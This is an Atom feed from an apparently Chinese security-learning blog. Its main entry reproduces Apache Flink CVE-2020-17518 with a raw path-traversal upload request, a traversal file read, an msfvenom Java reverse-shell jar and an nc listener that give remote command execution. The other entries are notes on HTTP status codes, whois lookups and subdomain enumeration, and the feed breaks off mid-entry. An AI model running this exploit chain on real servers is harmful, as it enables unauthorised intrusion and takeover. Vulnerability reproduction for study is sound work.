<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://avenue.cool</id>
    <title>凌晨的信息安全之路</title>
    <subtitle>Avenue-le</subtitle>
    <icon>http://avenue.cool/images/favicon.ico</icon>
    <link href="http://avenue.cool" />
    <author>
      <name>Avenue-le</name>
    </author>
    <updated>2021-02-01T09:30:59.000Z</updated>
    <category term="信息安全之路" />
    <category term="随学" />
    <category term="凌晨" />
    <entry>
        <id>http://avenue.cool/2020-2021-CVE/apache-Flink_CVE-2020-17518/</id>
        <title>Apache-Flink_CVE-2020-17518</title>
        <link rel="alternate" href="http://avenue.cool/2020-2021-CVE/apache-Flink_CVE-2020-17518/"/>
        <content type="html">&lt;!-- build time:Tue Feb 02 2021 09:24:25 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;apache-flink文件上传&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache-flink文件上传&#34;&gt;#&lt;/a&gt; Apache Flink 文件上传&lt;/h1&gt;&lt;h2 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 【原理】&lt;/h2&gt;&lt;p&gt;Apache Flink 是由 Apache 软件基金会开发的开源流处理框架，其核心是用 Java 和 Scala 编写的分布式流数据流引擎。Flink 以数据并行和流水线方式执行任意流数据程序，Flink 的流水线运行时系统可以执行批处理和流处理程序。此外，Flink 的运行时本身也支持迭代算法的执行。Flink 在 1.5.1 版本中引入了一个 REST handler，这允许攻击者将已上传的文件写入本地任意位置的文件中，并且可通过一个恶意修改的 HTTP 头将这些文件写入到 Flink 1.5.1 可以访问的任意位置。&lt;/p&gt;&lt;h2 id=&#34;工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 【工具】&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;浏览器&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#步骤&#34;&gt;#&lt;/a&gt; 【步骤】&lt;/h2&gt;&lt;p&gt;访问：http://your-ip:8081 进入 Apache Flink 控制面板：&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;打开 BUrp 构造 POC，上传文件&lt;/p&gt;&lt;pre&gt;&lt;code&gt;
POST /jars/upload HTTP/1.1
Host: 192.168.243.189:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------13247690941547071692111317477
Content-Length: 250
Origin: http://192.168.243.189:8081
Connection: close
Referer: http://192.168.243.189:8081/

-----------------------------13247690941547071692111317477
Content-Disposition: form-data; name=&amp;quot;jarfile&amp;quot;; filename=&amp;quot;../../../../../../tmp/success&amp;quot;
Content-Type: text/plain


success
-----------------------------13247690941547071692111317477-

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;此时，我们利用之前的任意文件读取漏洞，读取我们上传的文件，查看是否上传成功。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;http://192.168.243.189:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fsuccess

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;我们还可以上传 jar 马实现反弹监听从而远程命令执行&lt;/p&gt;&lt;p&gt;首先我们使用 kali 的 MSF 生成 jar 马：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p java/shell_reverse_tcp lhost=192.168.243. lport=5555 -f jar &amp;gt;/home/kali/Desktop/shell.jar
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;然后本地机器新建命令行窗口，使用 nc 进行端口监听：&lt;/p&gt;&lt;p&gt;nc -lvvp 5555&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;最后把生成的 jar 马通过 Submit New Job 模块进行上传：&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;点击 Submit 即可实现 jar 马反弹监听：&lt;/p&gt;&lt;p&gt;可以执行远程命令：&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/apache-Flink_CVE-2020-17518/8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="2020-2021-CVE漏洞复现" scheme="http://avenue.cool/categories/2020-2021-CVE/" />
        <category term="2020-2021-CVE漏洞复现" scheme="http://avenue.cool/tags/2020-2021-CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
        <updated>2021-02-01T09:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Web-Foundation/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/</id>
        <title>4. WEB HTTP 状态码</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Web-Foundation/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/"/>
        <content type="html">&lt;!-- build time:Tue Feb 02 2021 09:24:25 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;常见的状态码含义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的状态码含义&#34;&gt;#&lt;/a&gt; 常见的状态码含义：&lt;/h2&gt;&lt;p&gt;100 继续 ： 服务器返回此代码已收到请求的第一部分，正在等待其他部分。&lt;br&gt;101 切换协议： 请求者要求服务器切换协议，服务器已确认并准备切换。&lt;br&gt;200 成功：表示客户端发来的请求在服务器端被正常处理了。&lt;br&gt;301 永久移动：请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。&lt;br&gt;302 临时移动：服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求&lt;br&gt;400 Bad Request：表示请求报文中存在语法错误。&lt;br&gt;401 Unauthorized：表示发送的请求需要有通过 HTTP 认证的信息。&lt;br&gt;403 Forbidden：表明对请求资源的访问被服务器拒绝了。&lt;br&gt;404 Not Found：服务器无法找到请求的资源。&lt;br&gt;405 方法禁用：禁用请求中的方法。&lt;br&gt;408 请求超时： 服务器登后请求时发生超时。&lt;br&gt;500 Internal Server Error：表明服务器端在执行请求时发生了错误。&lt;br&gt;502 错误网关： 服务器作为网关或代理，从上游服务器收到无效响应。&lt;br&gt;503 Service Unavailable：表明服务器暂时处于超负载或进行停机维护&lt;br&gt;504 网关超时：服务器作为网关或代理，但是没有及时从上游服务器收到请求。&lt;br&gt;505 HTTP 版本不受支持：&lt;br&gt;服务器不支持请求中所用的 HTTP 协议版本。&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/categories/WEB/Web-Foundation/" />
        <category term="WEB基础知识" scheme="http://avenue.cool/tags/WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:31:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Information-Gathering/2.%20%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/</id>
        <title>2. 收集域名信息</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Information-Gathering/2.%20%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/"/>
        <content type="html">&lt;!-- build time:Tue Feb 02 2021 09:24:25 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;p&gt;知道目标域名之后，我们要做的第一件事情就是获取域名的注册信息，包括该域名的 DNS 服务器信息和注册人的联系信息等。&lt;/p&gt;&lt;h2 id=&#34;whois-查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#whois-查询&#34;&gt;#&lt;/a&gt; whois 查询&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;Whois 是一个标准的互联网协议，可以用于收集网络注册信息，注册的域名、IP地址等信息。在Whois查询中，得到注册人的姓名和邮箱信息通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。对中小站点而言，域名所属人往往就是管理员。kali中已经默认安装了whois。whois + 域名
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cua2FsaS5vcmcvZG93bmxvYWRzLw==&#34;&gt;Kali 下 whois 查询&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dob2lzLmNoaW5hei5jb20v&#34;&gt;域名 Whois 查询 - 站长之家&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aG9pcy5haXpoYW4uY29tLw==&#34;&gt;Whois - 爱站&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=&#34;&gt;IP-38&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cud2hvaXMubmV0Lw==&#34;&gt;Whois Lookup&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sb29rdXAuaWNhbm4ub3JnLw==&#34;&gt;ICANN Lookup&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aG9pcy5jbG91ZC50ZW5jZW50LmNvbS9kb21haW4/ZG9tYWluPQ==&#34;&gt;域名信息查询 - 腾讯云&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dob2lzLnhpbm5ldC5jb20v&#34;&gt;新网 whois 信息查询&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9pcHdob2lzLw==&#34;&gt;IP WHOIS 查询 - 站长工具&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;备案信息查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#备案信息查询&#34;&gt;#&lt;/a&gt; 备案信息查询&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;网站备案是根据国家法律规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5iZWlhbmJlaWFuLmNvbS8=&#34;&gt;ICP 备案查询网&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2ljcC5jaGluYXouY29tLw==&#34;&gt;ICP 备案查询 - 站长工具&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYWl6aGFuLmNvbS9zZW8v&#34;&gt;SEO 综合查询 - 爱站&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2ljcC5jaGluYXouY29tL3NlYXJjaHM=&#34;&gt;批量查询 - 站长工具&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iZWlhbi5taWl0Lmdvdi5jbi8jL0ludGVncmF0ZWQvaW5kZXg=&#34;&gt;工业和信息化部 ICP/IP/ 域名信息备案管理&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;企业信用信息查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#企业信用信息查询&#34;&gt;#&lt;/a&gt; 企业信用信息查询&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;企业信用指一家第三方征信机构通过征集另一家企业信息，根据征信机构的信用评级规则，评价出的企业信用等级。
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5nc3h0Lmdvdi5jbi9pbmRleC5odG1s&#34;&gt;国家企业信用信息公示系统&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb21wYW55LnhpemhpLmNvbS8=&#34;&gt;悉知 - 全国企业信息查询&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY3JlZGl0Y2hpbmEuZ292LmNuLw==&#34;&gt;信用中国 - 个人信用查询搜索 - 企业信息查询搜索&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudGlhbnlhbmNoYS5jb20v&#34;&gt;天眼查&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucWljaGFjaGEuY29tLw==&#34;&gt;企查查&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueGlhb2xhbmJlbi5jb20v&#34;&gt;小蓝本&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucWl4aW4uY29tLw==&#34;&gt;启信宝&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94aW4uYmFpZHUuY29tLw==&#34;&gt;百度企业信用&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&#34;浏览器插件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#浏览器插件&#34;&gt;#&lt;/a&gt; 浏览器插件&lt;/h2&gt;&lt;p&gt;通过 Google、FireFox 等插件的使用，收集域名信息&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="信息收集" scheme="http://avenue.cool/categories/WEB/Information-Gathering/" />
        <category term="信息收集" scheme="http://avenue.cool/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" />
        <updated>2020-09-06T02:31:20.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Information-Gathering/%7F3.%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
        <title>3. 子域名信息收集</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Information-Gathering/%7F3.%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
        <content type="html">&lt;!-- build time:Tue Feb 02 2021 09:24:25 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;收集子域名信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#收集子域名信息&#34;&gt;#&lt;/a&gt; 收集子域名信息&lt;/h2&gt;&lt;p&gt;主域名是由两个或两个以上字母构成，中间由点号隔开，这个域名只有一个点号，子域名是顶级域名的下一级，域名整体包含两个 “.” 号。&lt;/p&gt;&lt;p&gt;子域名也就是二级域名，是指顶级域名下的域名。假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正的目标，这无疑是个比较好的选择。那么问题来了，怎样才能尽可能多地搜集目标的高价值子域呢？常用的方法有以下这几种。&lt;/p&gt;&lt;h3 id=&#34;常见子域名的收集方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见子域名的收集方法&#34;&gt;#&lt;/a&gt; 常见子域名的收集方法：&lt;/h3&gt;&lt;p&gt;（1） Web 子域名猜测与实际访问尝试&lt;br&gt;（2） 搜索引擎查询主域名地址&lt;br&gt;（3）查询 DNS 解析记录&lt;br&gt;（4） 基于 DNS 查询的暴力破解&lt;br&gt;（5）手工分析（查看主站页面及相关页面）&lt;/p&gt;&lt;h3 id=&#34;在线平台查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#在线平台查询&#34;&gt;#&lt;/a&gt; 在线平台查询&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=&#34;&gt;ip138&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9zdWJkb21haW4vP2RvbWFpbj0v&#34;&gt;站长工具&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oYWNrZXJ0YXJnZXQuY29tL2ZpbmQtZG5zLWhvc3QtcmVjb3Jkcy8=&#34;&gt;hackertarget&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudDFoMnVhLmNuL3Rvb2xzLw==&#34;&gt;t1h2ua&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v&#34;&gt;dnsdumpster&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kLmNoaW5hY3ljYy5jb20vaW5kZXgucGhwP209TG9naW4mYW1wO2E9aW5kZXg=&#34;&gt;chinacycc&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v&#34;&gt;dnsdumpster&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3ouemNqdW4uY29tLw==&#34;&gt;zcjun&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy55dW02LmNuL1Rvb2xzL3VybGJsYXN0Lw==&#34;&gt;tools.yum6.cn&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rvb2xzLmJ1Z3NjYW5lci5jb20vc3ViZG9tYWluLw==&#34;&gt;tools.bugscaner&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&#34;ip反查绑定域名网站&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ip反查绑定域名网站&#34;&gt;#&lt;/a&gt; IP 反查绑定域名网站&lt;/h3&gt;&lt;p&gt;IP 关联域名，大部分网站一个 IP 多个域名&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3MudG9vbC5jaGluYXouY29tL3NhbWU/cw==&#34;&gt;站长之家&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kbnMuYWl6aGFuLmNvbS8=&#34;&gt;爱站&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cud2Vic2Nhbi5jYy8=&#34;&gt;webscan&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy4xMTRiZXN0LmNvbS9pcC8=&#34;&gt;同 IP 网站查询&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZXZlcnNlaXAuZG9tYWludG9vbHMuY29tLw==&#34;&gt;反向 IP 查询&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&#34;资产搜索引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资产搜索引擎&#34;&gt;#&lt;/a&gt; 资产搜索引擎&lt;/h3&gt;&lt;p&gt;google、shodan、FOFA、zoomeye&lt;/p&gt;&lt;h3 id=&#34;工具枚举&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具枚举&#34;&gt;#&lt;/a&gt; 工具枚举&lt;/h3&gt;&lt;p&gt;常用子域名工具如下（Github 上都可搜到）&lt;/p&gt;&lt;ol&gt;&lt;li&gt;OneForAll&lt;br&gt;OneForAll 是一款功能强大的子域收集工具，拥有多个模块和接口扫描，收集子域信息很全，包括子域、子域 IP、子域常用端口、子域 Title、子域 Banner、子域状态等。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGw=&#34;&gt;项目地址&lt;/span&gt;&lt;br&gt;子域名收集： python3 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL29uZWZvcmFsbC5weQ==&#34;&gt;oneforall.py&lt;/span&gt; --target=&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3RhcmdldC5jb20=&#34;&gt;target.com&lt;/span&gt; run&lt;/p&gt;&lt;ol start=&#34;2&#34;&gt;&lt;li&gt;&lt;p&gt;Layer&lt;br&gt;Layer 子域名挖掘机的使用方法比较简单，在域名对话框中直接输入域名就可以进行扫描，它的显示界面比较细致，有域名、解析 IP、开放端口、Web 服务器和网站状态等&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;subDomainsBrute&lt;br&gt;subDomainsBrute 的特点是可以用小字典递归地发现三级域名、四级域名，甚至五级域名等不容易被探测到的域名。&lt;br&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N1YkRvbWFpbnNCcnV0ZQ==&#34;&gt;项目地址&lt;/span&gt;&lt;br&gt;子域名收集：python &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3N1YkRvbWFpbnNicnV0ZS5weQ==&#34;&gt;subDomainsbrute.py&lt;/span&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3h0YXJnZXQuY29t&#34;&gt;xtarget.com&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 id=&#34;证书透明度公开日志枚举&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#证书透明度公开日志枚举&#34;&gt;#&lt;/a&gt; 证书透明度公开日志枚举&lt;/h3&gt;&lt;p&gt;证书透明度 (Certificate Transparency, CT) 是证书授权机构 (CA) 的一个项目，证书授权机构会将每个 SSL/TLS 证书发布到公共日志中。一个 SSL/TLS 证书通常包含域名、子域名和邮件地址， 这些也经常成为攻击者非常希望获得的有用信息。查找某个域名所属证书的最简单的方法就是使用搜索引 | 擎搜索一些公开的 CT 日志。&lt;/p&gt;&lt;p&gt;在线第三方平台查询&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jcnQuc2gv&#34;&gt;crt.sh&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jZW5zeXMuaW8v&#34;&gt;censys&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9teXNzbC5jb20v&#34;&gt;myssl&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&#34;ns历史解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ns历史解析&#34;&gt;#&lt;/a&gt; NS 历史解析&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZG5zZGIuaW8v&#34;&gt;dnsdb&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92aWV3ZG5zLmluZm8v&#34;&gt;viewdns&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="WEB安全知识" scheme="http://avenue.cool/categories/WEB/" />
        <category term="信息收集" scheme="http://avenue.cool/categories/WEB/Information-Gathering/" />
        <category term="信息收集" scheme="http://avenue.cool/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" />
        <updated>2020-09-06T02:31:20.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Intranet/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/</id>
        <title>内网安全知识</title>
        <link rel="alternate" href="http://avenue.cool/Intranet/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
        <content type="html">&lt;!-- build time:Tue Feb 02 2021 09:24:25 GMT+0800 (中国标准时间) --&gt;&lt;p&gt;内网安全知识&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="内网安全知识" scheme="http://avenue.cool/categories/Intranet/" />
        <category term="内网安全知识" scheme="http://avenue.cool/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Linux/Linux/</id>
        <title>Linuxdf</title>
        <link rel="alternate" href="http://avenue.cool/Linux/Linux/"/>
        <content type="html">&lt;!-- build time:Tue Feb 02 2021 09:24:25 GMT+0800 (中国标准时间) --&gt;&lt;p&gt;linux&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="Linux运维" scheme="http://avenue.cool/categories/Linux/" />
        <category term="Linux运维" scheme="http://avenue.cool/tags/Linux%E8%BF%90%E7%BB%B4/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Python/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/</id>
        <title>Python语言学习</title>
        <link rel="alternate" href="http://avenue.cool/Python/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
        <content type="html">&lt;!-- build time:Tue Feb 02 2021 09:24:25 GMT+0800 (中国标准时间) --&gt;&lt;p&gt;this is test&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="Python语言学习" scheme="http://avenue.cool/categories/Python/" />
        <category term="Python语言学习" scheme="http://avenue.cool/tags/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" />
        <updated>2020-09-06T02:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/WEB/Information-Gathering/1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
        <title>1. 为什么要进行信息收集</title>
        <link rel="alternate" href="http://avenue.cool/WEB/Information-Gathering/1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
